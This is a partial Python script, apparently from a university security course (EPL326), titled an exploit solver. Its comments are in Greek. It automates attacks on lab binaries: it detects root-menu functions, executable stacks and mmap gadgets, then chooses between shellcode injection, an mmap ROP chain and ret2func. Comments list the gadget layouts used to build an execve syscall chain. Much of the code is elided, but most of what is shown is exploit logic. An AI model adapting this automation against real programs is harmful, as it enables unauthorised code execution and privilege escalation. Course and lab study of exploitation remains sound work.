...
Χρήση:
  python3 epl326_solver_v17.py ./bin.X                          # πλήρως αυτόματο
  python3 epl326_solver_v17.py ./bin.X --stack-addr 0xbfffe2e4  # manual override
  python3 epl326_solver_v17.py ./bin.X --mmap-result 0xf7700000 # manual override
...
def analyze(binary):
    ...
    # Fix 1: ψάχνουμε για οποιαδήποτε *_menu function (display_root_menu, root_menu, admin_menu κλπ)
    # Προτεραιότητα: display_root_menu > root_menu > οποιαδήποτε άλλη *menu*
    menu_func = None
    if "display_root_menu" in funcs:
        menu_func = "display_root_menu"
    else:
        # Ψάχνουμε functions που τελειώνουν σε _menu ή περιέχουν menu
        # Εξαιρούμε main και display_file
        candidates = [f for f in funcs if "menu" in f.lower() and f not in ("main", "display_file")]
        if candidates:
            # Προτίμησε αυτή που καλείται από main (βρίσκεται στο disasm της main)
            main_calls = []
            in_main = False
            for line in disasm.splitlines():
                ...
                for c in candidates:
                    if f"<{c}" in line:
                        main_calls.append(c)
            menu_func = main_calls[0] if main_calls else candidates[0]
    if menu_func:
        info["has_drm"] = True
        info["drm_addr"] = funcs[menu_func]
    ...
    if info["has_mmap"]:
        ...
        if gb.get(0) == 0x58:
            info["gadget_layout"] = "A"
        elif gb.get(0) == 0x31:
            # Διάκρισε B (bin.1) από C (bin.2) βάσει offset 0x09
            # bin.1: offset 9 = 0x31 (xor ecx,ecx)
            # bin.2: offset 9 = 0x89 (mov eax,ebx)
            if gb.get(9) == 0x89:
                info["gadget_layout"] = "C"  # bin.2: mov_ebx @ +9, xor_ecx @ +12
            else:
                info["gadget_layout"] = "B"  # bin.1: xor_ecx @ +9, mov_ebx @ +12
        else:
            info["gadget_layout"] = None
    ...
    # Fix 2: ανίχνευση malloc στο display_file → heap buffer → shellcode δεν δουλεύει
    # αν υπάρχει menu function → ret2func αντί για shellcode
    has_malloc_in_display = False
    in_disp2 = False
    for line in disasm.splitlines():
        if "<display_file>:" in line: in_disp2 = True; continue
        if in_disp2 and re.match(r"[0-9a-f]+ <[^>]+>:", line) and "display_file" not in line:
            in_disp2 = False
        if not in_disp2: continue
        if "<malloc" in line:
            has_malloc_in_display = True
            break

    # Προτεραιότητα: shellcode > rop_mmap > ret2func (malloc) > ret2func > shellcode
    if info["stack_exec"]:
        info["attack_type"] = "shellcode"
    elif info["has_mmap"]:
        info["attack_type"] = "rop_mmap"
    elif has_malloc_in_display and info["has_drm"]:
        info["attack_type"] = "ret2func"
    elif info["has_drm"]:
        info["attack_type"] = "ret2func"
    else:
        info["attack_type"] = "shellcode"
...
def build_rop(info, mmap_result, no_temp_offset=False):
    ...
    if layout == "A":
        ...
        # Layout C: bin.2 — xor eax first, mov_ebx @ +9, xor_ecx @ +12
        # +0:  xor eax,eax; ret
        # +3:  pop eax; pop ebx; ret
        # +6:  mov eax,(ebx); ret
        # +9:  mov eax,ebx; ret      <-- ΔΙΑΦΟΡΑ από B
        # +12: xor ecx,ecx; ret      <-- ΔΙΑΦΟΡΑ από B
        # +15: xor edx,edx; ret
        # +18: mov $0xb,%al; ret
        # +21: int $0x80; ret
        ...
        # Layout B: bin.1 — xor eax first, xor_ecx @ +9, mov_ebx @ +12
        # +0:  xor eax,eax; ret
        # +3:  pop eax; pop ebx; ret
        # +6:  mov eax,(ebx); ret
        # +9:  xor ecx,ecx; ret
...
def main():
    ap = argparse.ArgumentParser(
        description="EPL326 — Exploit Solver v17 (+ Shellcode Gen)",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            "Παραδείγματα:\n"
            "  python3 epl326_solver_v17.py ./bin.X                          # αυτόματο\n"
            "  python3 epl326_solver_v17.py ./bin.X --stack-addr 0xbfffe2e4  # manual\n"
            "  python3 epl326_solver_v17.py ./bin.X --mmap-result 0xf7700000 # manual\n"
        )
    )
